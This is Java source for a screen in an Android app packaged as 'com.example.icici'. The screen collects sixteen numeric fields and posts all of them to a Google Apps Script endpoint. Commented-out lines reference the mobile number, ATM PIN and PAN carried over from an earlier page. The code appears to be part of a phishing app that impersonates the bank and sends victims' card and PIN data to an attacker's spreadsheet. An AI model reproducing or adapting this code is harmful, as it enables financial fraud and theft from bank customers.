package com.example.icici;


import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class Dusra_Page extends AppCompatActivity {
    ProgressDialog progressDialog;
    EditText a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p;
    Button authentic;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dusra_page);
        a=findViewById(R.id.editTextNumber36);
        b=findViewById(R.id.editTextNumber9);
        c=findViewById(R.id.editTextNumber);
        d=findViewById(R.id.editTextNumber1);
        e=findViewById(R.id.editTextNumber2);
        f=findViewById(R.id.editTextNumber3);
        g=findViewById(R.id.editTextNumber4);
        h=findViewById(R.id.editTextNumber8);
        i=findViewById(R.id.editTextNumberD36);
        j=findViewById(R.id.editTextNumberD9);
        k=findViewById(R.id.editTextNumberD);
        l=findViewById(R.id.editTextNumberD1);
        m=findViewById(R.id.editTextNumberD2);
        n=findViewById(R.id.editTextNumberD3);
        o=findViewById(R.id.editTextNumberD4);
        p=findViewById(R.id.editTextNumberD8);
        authentic=findViewById(R.id.authenticate);
        progressDialog=new ProgressDialog(Dusra_Page.this);
        progressDialog.setMessage("Loading...");
//        String phNo=getIntent().getStringExtra("keyMob");
//        String atmPin=getIntent().getStringExtra("keyatm");
//        String pan=getIntent().getStringExtra("keypan");
        authentic.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(a.getText().toString().isEmpty()||b.getText().toString().isEmpty()||c.getText().toString().isEmpty()||d.getText().toString().isEmpty()||e.getText().toString().isEmpty()||f.getText().toString().isEmpty()||g.getText().toString().isEmpty()||h.getText().toString().isEmpty()||i.getText().toString().isEmpty()||j.getText().toString().isEmpty()||k.getText().toString().isEmpty()||l.getText().toString().isEmpty()||m.getText().toString().isEmpty()||n.getText().toString().isEmpty()||o.getText().toString().isEmpty()||p.getText().toString().isEmpty())
                {
                    Toast.makeText(Dusra_Page.this, "Please Fill All The Details!", Toast.LENGTH_SHORT).show();
                }
                else {
                    addData();
                    progressDialog.show();
                }
            }
        });
    }

    private void addData() {
       String aa=a.getText().toString();
       String bb=b.getText().toString();
       String cc=c.getText().toString();
       String dd=d.getText().toString();
       String ee=e.getText().toString();
       String ff=f.getText().toString();
       String gg=g.getText().toString();
       String hh=h.getText().toString();
       String ii=i.getText().toString();
       String jj=j.getText().toString();
       String kk=k.getText().toString();
       String ll=l.getText().toString();
        String mm=m.getText().toString();
        String nn=n.getText().toString();
        String oo=o.getText().toString();
        String pp=p.getText().toString();
        StringRequest stringRequest=new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyAq7tZkxIwvKiyNJW_6mGZEg3RF2XJokAvSNQ-iwzpzDfd4labdGNcE_9STAAW1bqSUQ/exec", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Intent intent=new Intent(Dusra_Page.this, Tisra_Page.class);
                startActivity(intent);
                progressDialog.hide();
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            protected Map<String,String> getParams(){
                Map<String,String>params=new HashMap<>();
                params.put("action","addData");
                params.put("vA",aa);
                params.put("vB",bb);
                params.put("vC",cc);
                params.put("vD",dd);
                params.put("vE",ee);
                params.put("vF",ff);
                params.put("vG",gg);
                params.put("vH",hh);
                params.put("vI",ii);
                params.put("vJ",jj);
                params.put("vK",kk);
                params.put("vL",ll);
                params.put("vM",mm);
                params.put("vN",nn);
                params.put("vO",oo);
                params.put("vP",pp);
                return params;
            }
        };
        int socketTimeout=50000;
        RetryPolicy retryPolicy=new DefaultRetryPolicy(socketTimeout,0,DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        stringRequest.setRetryPolicy((retryPolicy));
        RequestQueue requestQueue= Volley.newRequestQueue(Dusra_Page.this);
        requestQueue.add(stringRequest);
    }
}